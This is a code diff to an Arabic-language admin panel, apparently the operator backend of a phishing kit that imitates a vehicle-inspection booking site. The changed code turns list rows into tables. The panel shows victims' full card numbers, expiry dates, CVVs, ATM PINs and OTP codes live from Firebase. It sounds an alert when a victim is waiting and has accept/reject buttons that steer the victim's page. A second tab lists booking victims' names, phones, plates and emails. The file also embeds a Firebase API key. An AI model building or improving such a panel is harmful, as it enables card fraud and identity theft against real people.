@@ -3,41 +3,40 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>لوحة التحكم - سطر واحد</title>
+    <title>لوحة تحكم المهندس حسن</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #ccc; margin: 0; padding: 0; }
-        .navbar { background: #1e7344; padding: 10px; display: flex; justify-content: center; gap: 10px; position: sticky; top: 0; z-index: 1000; }
-        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 8px 20px; border-radius: 5px; cursor: pointer; }
-        .nav-btn.active { background: white; color: #1e7344; font-weight: bold; }
-        .visitor-counter { background: #ffd700; color: #000; padding: 5px; text-align: center; font-weight: bold; font-size: 14px; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0a0a0a; color: #eee; margin: 0; padding: 0; overflow-x: hidden; }
+        .navbar { background: #1e7344; padding: 10px; display: flex; justify-content: center; gap: 15px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 10px rgba(0,0,0,0.5); }
+        .nav-btn { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); color: white; padding: 10px 25px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .nav-btn.active { background: white; color: #1e7344; }
+        .visitor-counter { background: #ffd700; color: #000; padding: 8px; text-align: center; font-weight: bold; font-size: 15px; }
         
-        .container { padding: 10px; }
-        .tab-content { display: none; }
+        .container { padding: 15px; width: 100%; box-sizing: border-box; }
+        .tab-content { display: none; width: 100%; overflow-x: auto; } /* يسمح بالسحب الأفقي لو البيانات كتير */
         .tab-content.active { display: block; }
 
-        /* تنسيق السطر الواحد */
-        .data-header { display: flex; background: #1a1a1a; padding: 10px; border-radius: 5px; margin-bottom: 5px; font-weight: bold; font-size: 12px; color: #888; border-bottom: 2px solid #333; }
-        .data-row { display: flex; align-items: center; background: #161616; padding: 8px 10px; margin-bottom: 4px; border-radius: 4px; border: 1px solid #222; transition: 0.3s; gap: 10px; }
+        /* تنسيق الجدول العام */
+        .data-table { width: 100%; border-collapse: collapse; min-width: 1200px; background: #161616; border-radius: 8px; overflow: hidden; }
+        .data-table th { background: #222; color: #888; padding: 12px; text-align: right; font-size: 13px; border-bottom: 2px solid #333; white-space: nowrap; }
+        .data-table td { padding: 12px; border-bottom: 1px solid #222; white-space: nowrap; font-size: 14px; vertical-align: middle; }
         
-        /* تقسيم الأعمدة */
-        .col-name { width: 150px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-weight: bold; }
-        .col-card { width: 180px; font-family: monospace; letter-spacing: 1px; color: #aaa; }
-        .col-date { width: 80px; text-align: center; }
-        .col-cvv  { width: 60px; text-align: center; }
-        .col-pin  { width: 80px; text-align: center; color: #9c27b0; font-weight: bold; }
-        .col-otp  { width: 100px; text-align: center; color: #2196f3; font-weight: bold; }
-        .col-btns { flex-grow: 1; display: flex; gap: 5px; justify-content: flex-end; }
-
-        /* حالة التنبيه للجديد */
-        .is-new-row { border-color: #28a745 !important; background: #0d2112 !important; color: #fff !important; }
-        .is-new-row .col-card { color: #fff; }
+        /* تأثير السطر الجديد */
+        .is-new-row { background: #0d2112 !important; animation: highlight 2s infinite alternate; }
+        @keyframes highlight { from { box-shadow: inset 0 0 0px #28a745; } to { box-shadow: inset 0 0 10px #28a745; } }
+        .is-new-row td { color: #fff !important; font-weight: bold; }
 
         /* الأزرار */
-        .btn { padding: 6px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 11px; background: #333; color: #666; transition: 0.2s; }
-        .btn-green.active { background: #28a745 !important; color: white !important; }
-        .btn-red.active { background: #dc3545 !important; color: white !important; }
+        .btn-group { display: flex; gap: 5px; }
+        .btn { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 12px; background: #333; color: #666; transition: 0.3s; }
+        .active-green { background: #28a745 !important; color: white !important; box-shadow: 0 0 10px rgba(40,167,69,0.5); }
+        .active-red { background: #dc3545 !important; color: white !important; box-shadow: 0 0 10px rgba(220,53,69,0.5); }
+
+        /* تمييز الخانات الحساسة */
+        .col-card { font-family: monospace; letter-spacing: 1px; color: #fff; background: #1a1a1a; padding: 5px 10px; border-radius: 4px; }
+        .col-otp { color: #2196f3; font-weight: bold; font-size: 16px; }
+        .col-pin { color: #9c27b0; font-weight: bold; font-size: 16px; }
 
         #loginOverlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #1e7344; display: flex; align-items: center; justify-content: center; z-index: 9999; }
     </style>
@@ -47,36 +46,55 @@
 <audio id="alertSound" src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto"></audio>
 
 <div id="loginOverlay">
-    <div style="background:white; padding:30px; border-radius:10px; text-align:center;">
-        <h3 style="color:#1e7344; margin:0 0 15px 0;">لوحة تحكم حسن</h3>
-        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:10px; margin-bottom:10px;">
-        <button onclick="checkLogin()" style="width:100%; padding:10px; background:#1e7344; color:white; border:none; border-radius:5px; cursor:pointer;">دخول</button>
+    <div style="background:white; padding:40px; border-radius:15px; text-align:center; width: 300px;">
+        <h2 style="color:#1e7344; margin:0 0 20px 0;">دخول المهندس حسن</h2>
+        <input type="password" id="password" placeholder="كلمة المرور" style="width:100%; padding:12px; margin-bottom:15px; border:1px solid #ddd; border-radius:5px;">
+        <button onclick="checkLogin()" style="width:100%; padding:12px; background:#1e7344; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold;">دخول آمن</button>
     </div>
 </div>
 
 <div id="adminContent">
-    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> 🌐</div>
+    <div class="visitor-counter">المتواجدون الآن: <span id="onlineCount">0</span> زائر 🌐</div>
     <div class="navbar">
-        <button class="nav-btn active" onclick="openTab(event, 'cardsSection')">💳 البطاقات</button>
-        <button class="nav-btn" onclick="openTab(event, 'bookingSection')">👤 الحجوزات</button>
+        <button class="nav-btn active" onclick="openTab(event, 'cardsSection')">💳 بيانات البطاقات</button>
+        <button class="nav-btn" onclick="openTab(event, 'bookingSection')">👤 بيانات الحجوزات</button>
         <button class="nav-btn" onclick="logout()" style="background:#000">🚪 خروج</button>
     </div>
 
     <div class="container">
         <div id="cardsSection" class="tab-content active">
-            <div class="data-header">
-                <div class="col-name">الاسم</div>
-                <div class="col-card">رقم البطاقة</div>
-                <div class="col-date">التاريخ</div>
-                <div class="col-cvv">CVV</div>
-                <div class="col-pin">PIN</div>
-                <div class="col-otp">OTP</div>
-                <div class="col-btns">الإجراء</div>
-            </div>
-            <div id="paymentsList"></div>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>اسم العميل</th>
+                        <th>رقم البطاقة</th>
+                        <th>الانتهاء</th>
+                        <th>CVV</th>
+                        <th>رقم PIN</th>
+                        <th>كود OTP</th>
+                        <th>الإجراءات</th>
+                    </tr>
+                </thead>
+                <tbody id="paymentsList"></tbody>
+            </table>
         </div>
+
         <div id="bookingSection" class="tab-content">
-            <div id="bookingList"></div>
+            <table class="data-table">
+                <thead>
+                    <tr>
+                        <th>الاسم بالكامل</th>
+                        <th>رقم التليفون</th>
+                        <th>نوع السيارة</th>
+                        <th>رقم اللوحة</th>
+                        <th>موعد الحجز</th>
+                        <th>الوقت</th>
+                        <th>الجيميل</th>
+                        <th>بلد التسجيل</th>
+                    </tr>
+                </thead>
+                <tbody id="bookingList"></tbody>
+            </table>
         </div>
     </div>
 </div>
@@ -93,8 +111,7 @@
             apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT8X6X8X6X8",
             authDomain: "saso-inspection.firebaseapp.com",
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com",
-            projectId: "saso-inspection",
-            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com"
+            projectId: "saso-inspection"
         };
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
@@ -106,12 +123,11 @@
             document.getElementById('onlineCount').innerText = active;
         });
 
-        // تحميل البطاقات - سطر واحد
+        // 1. معالجة البطاقات
         database.ref('payments').on('child_added', s => {
-            renderRow(s.key, s.val());
+            renderCardRow(s.key, s.val());
         });
 
-        // التحديثات الحية (تفعيل التنبيه)
         database.ref('payments').on('child_changed', s => {
             const val = s.val();
             const row = document.getElementById('row_' + s.key);
@@ -121,38 +137,59 @@
                 
                 if(val.status && val.status.includes('waiting')) {
                     row.classList.add('is-new-row');
-                    row.querySelector('.btn-green').classList.add('active');
-                    row.querySelector('.btn-red').classList.add('active');
+                    row.querySelector('.btn-green').classList.add('active-green');
+                    row.querySelector('.btn-red').classList.add('active-red');
                     playSound();
                 }
-
                 if(val.status === 'accept' || val.status === 'reject') {
                     row.classList.remove('is-new-row');
-                    row.querySelector('.btn-green').classList.remove('active');
-                    row.querySelector('.btn-red').classList.remove('active');
+                    row.querySelector('.btn-green').classList.remove('active-green');
+                    row.querySelector('.btn-red').classList.remove('active-red');
                 }
             }
         });
+
+        // 2. معالجة الحجوزات
+        database.ref('visitors').on('child_added', s => {
+            renderBookingRow(s.val());
+        });
     }
 
-    function renderRow(key, val) {
+    function renderCardRow(key, val) {
         const list = document.getElementById('paymentsList');
-        const div = document.createElement('div');
-        div.className = 'data-row';
-        div.id = 'row_' + key;
-        div.innerHTML = `
-            <div class="col-name">${val.cardHolder || 'عميل'}</div>
-            <div class="col-card">${val.cardNumber}</div>
-            <div class="col-date">${val.expiry}</div>
-            <div class="col-cvv">${val.cvv}</div>
-            <div class="col-pin">${val.atm_pin || '-'}</div>
-            <div class="col-otp">${val.otp || '-'}</div>
-            <div class="col-btns">
-                <button class="btn btn-green" onclick="updateStat('${key}', 'accept')">قبول</button>
-                <button class="btn btn-red" onclick="updateStat('${key}', 'reject')">رفض</button>
-            </div>
+        const tr = document.createElement('tr');
+        tr.id = 'row_' + key;
+        tr.innerHTML = `
+            <td style="color:#28a745; font-weight:bold;">${val.cardHolder || 'عميل'}</td>
+            <td><span class="col-card">${val.cardNumber}</span></td>
+            <td>${val.expiry}</td>
+            <td><span style="background:#444; padding:2px 6px; border-radius:3px;">${val.cvv}</span></td>
+            <td class="col-pin">${val.atm_pin || '-'}</td>
+            <td class="col-otp">${val.otp || '-'}</td>
+            <td>
+                <div class="btn-group">
+                    <button class="btn btn-green" onclick="updateStat('${key}', 'accept')">قبول</button>
+                    <button class="btn btn-red" onclick="updateStat('${key}', 'reject')">رفض</button>
+                </div>
+            </td>
         `;
-        list.prepend(div); // الجديد دايماً فوق
+        list.prepend(tr);
+    }
+
+    function renderBookingRow(val) {
+        const list = document.getElementById('bookingList');
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+            <td style="color:#ffd700;">${val.fullName || '-'}</td>
+            <td>${val.phone || '-'}</td>
+            <td>${val.vehicleType || '-'}</td>
+            <td>${val.plateNumber || '-'}</td>
+            <td>${val.bookingDate || '-'}</td>
+            <td>${val.bookingTime || '-'}</td>
+            <td style="font-size:12px; color:#aaa;">${val.email || '-'}</td>
+            <td>${val.country || '-'}</td>
+        `;
+        list.prepend(tr);
     }
 
     function updateStat(id, action) {
